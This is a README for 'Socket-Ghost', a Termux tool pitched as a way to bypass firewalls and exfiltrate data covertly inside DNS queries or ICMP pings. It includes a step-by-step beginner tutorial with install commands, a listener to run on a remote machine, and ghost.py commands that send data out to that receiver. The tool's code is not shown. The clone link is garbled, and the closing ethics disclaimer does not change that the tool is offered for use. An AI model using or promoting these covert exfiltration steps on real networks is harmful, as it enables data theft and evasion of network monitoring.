**Socket-Ghost** is a masterpiece of stealth networking. It allows you to bypass firewalls and exfiltrate data from **Termux** by masquerading traffic as harmless DNS queries or ICMP pings.

---

## ⚡ Features
* **AES-256 Encryption:** Your data is encrypted before it leaves the device.
* **Protocol Masquerading:** Disguises data as standard website lookups (DNS) or Pings (ICMP).
* **User-Agent Rotation:** Mimics different devices (iPhone, Spotify, Chrome) to stay hidden.
* **Lightweight:** Optimized specifically for Android/Termux ARM processors.

---

## 🟢 Beginner's Tutorial (Step-by-Step)

### Step 1: Prepare the Environment
Open Termux and copy-paste these commands one by one:

```bash
# Update the system
pkg update && pkg upgrade -y

# Clone your new masterpiece repo
git clone [https://github.com/minatonamikaze359/Socket-Ghost.git](https://github.com/YOUR_USERNAME/Socket-Ghost.git)
cd Socket-Ghost

# Run the auto-installer
chmod +x setup.sh
./setup.sh

Step 2: Set up the "Receiver" (The Bridge)
You need a second machine (like a Kali Linux PC or a VPS) to catch the data.
 * On your PC, open a terminal and find your IP: ifconfig (Let's say it is 192.168.1.10).
 * Run the listener:
   sudo python3 bridge.py

Step 3: Send Data (The Ghost)
Go back to Termux on your phone. Now you will send a "Ghost" signal to your PC.
Option A: DNS Mode (Highly Recommended)
This hides your message inside a website lookup.
python ghost.py -t 192.168.1.10 -d "Secret Message Here" -m dns

Option B: ICMP Mode (The Silent Ping)
This hides your message inside a ping request.
python ghost.py -t 192.168.1.10 -d "Target Coordinates" -m icmp

📁 Repository Structure
 * ghost.py: The main tool you run in Termux.
 * bridge.py: The listener you run on your PC.
 * core/: Contains the "Guts" (Encryption, Banner, and Dev info).
 * agents.txt: A list of "Disguises" for your traffic.
 * setup.sh: The one-click installer.
👤 Developer Profile
Run the following to see the architect's signature:
python ghost.py --about

📜 Legal & Ethics
This tool is for Ethical Hacking and Educational Purposes only.
 * Never use this on a network you don't own.
 * Always get permission before testing.
 * Don't be a script kiddie; understand how the code works!
"The faster you move, the harder you are to catch." — Minato Namikaze
